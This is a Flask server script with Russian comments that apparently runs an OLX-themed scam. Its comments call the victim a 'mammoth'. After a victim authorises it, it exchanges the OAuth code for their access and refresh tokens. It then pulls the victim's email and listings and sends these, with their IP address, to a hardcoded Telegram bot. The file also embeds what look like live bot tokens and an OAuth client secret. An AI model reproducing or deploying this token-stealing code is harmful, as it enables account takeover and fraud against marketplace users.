from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import os
import json

app = Flask(__name__)

# ---- ТВОИ КОНФИГУРАЦИИ (Проверь их перед запуском!) ----
TG_TOKEN = "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw"
TG_CHAT_ID = "-1003455979409"
CLIENT_ID = "202421"
CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
REDIRECT_URI = "https://maun-producton.up.railway.app/" 

OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_logo.svg/250px-OLX_green_logo.svg.png"

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                     json={
                         "chat_id": TG_CHAT_ID, 
                         "text": msg, 
                         "parse_mode": "HTML", 
                         "disable_web_page_preview": True
                     },
                     timeout=10)
    except Exception as e:
        print(f"Ошибка отправки в TG: {e}")

@app.route('/')
def index():
    # Загружаем объявления из кук для отображения мамонту
    ads_cookie = request.cookies.get('user_ads')
    user_ads = json.loads(ads_cookie) if ads_cookie else None
    
    try:
        # Читаем твой index.html
        with open('index.html', 'r', encoding='utf-8') as f:
            html_content = f.read()
            return render_template_string(html_content, user_ads=user_ads)
    except Exception as e:
        return f"Ошибка загрузки шаблона: {e}", 500

@app.route('/get_token', methods=['POST'])
def get_token():
    data = request.get_json(silent=True) or {}
    code = data.get('code')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not code: 
        return jsonify({"error": "Код не передан"}), 400

    # Обмен кода на токены
    token_url = 'https://www.olx.ua/api/open/oauth/token'
    payload = {
        'grant_type': 'authorization_code',
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write v2'
    }
    
    try:
        response = requests.post(token_url, data=payload, timeout=15)
        
        if response.status_code == 200:
            res_json = response.json()
            access = res_json.get('access_token')
            refresh = res_json.get('refresh_token')
            
            auth_headers = {
                "Authorization": f"Bearer {access}", 
                "Version": "2.0", 
                "Accept": "application/json"
            }
            
            # 1. Получаем Email пользователя
            email = "Не указан"
            try:
                u_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
                if u_req.status_code == 200:
                    email = u_req.json().get('data', {}).get('email', email)
            except: pass

            # 2. Получаем список объявлений (для отображения на сайте и в логе)
            ad_list_for_cookie = [] 
            ad_links_for_tg = "" 
            
            try:
                ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 10}, timeout=7)
                if ads_req.status_code == 200:
                    ads_data = ads_req.json().get('data', [])
                    for i, ad in enumerate(ads_data):
                        title = ad.get('title', 'Без названия')
                        url = ad.get('url', 'https://olx.ua')
                        # Сохраняем для фронтенда
                        ad_list_for_cookie.append({"title": title, "url": url, "img": OLX_LOGO})
                        # Формируем список для Телеграма
                        ad_links_for_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
            except: pass

            # 3. ФОРМИРУЕМ ЛОГ ДЛЯ ТЕЛЕГРАМА (На русском)
            msg = (
                f"🔥 <b>ЕСТЬ ВХОД OLX!</b>\n"
                f"--------------------------\n"
                f"🌐 <b>IP:</b> <code>{user_ip}</code>\n"
                f"📧 <b>Email:</b> <code>{email}</code>\n\n"
                f"🔑 <b>ACCESS TOKEN:</b>\n<code>{access}</code>\n\n"
                f"🔄 <b>REFRESH TOKEN:</b>\n<code>{refresh}</code>\n\n"
                f"📦 <b>ОБЪЯВЛЕНИЯ:</b>\n{ad_links_for_tg if ad_links_for_tg else 'Объявлений не найдено'}\n"
                f"--------------------------"
            )
            send_telegram_message(msg)

            # 4. Сохраняем данные в куки и отвечаем фронтенду
            resp = make_response(jsonify({"status": "ok"}))
            # Кука живет 1 час, чтобы фронт мог отрисовать список после редиректа
            resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600)
            return resp
        
        else:
            print(f"Ошибка OLX API: {response.text}")
            return jsonify({"error": "Не удалось обменять код на токен"}), 400

    except Exception as e:
        print(f"Критическая ошибка: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    # Railway автоматически подставит нужный PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
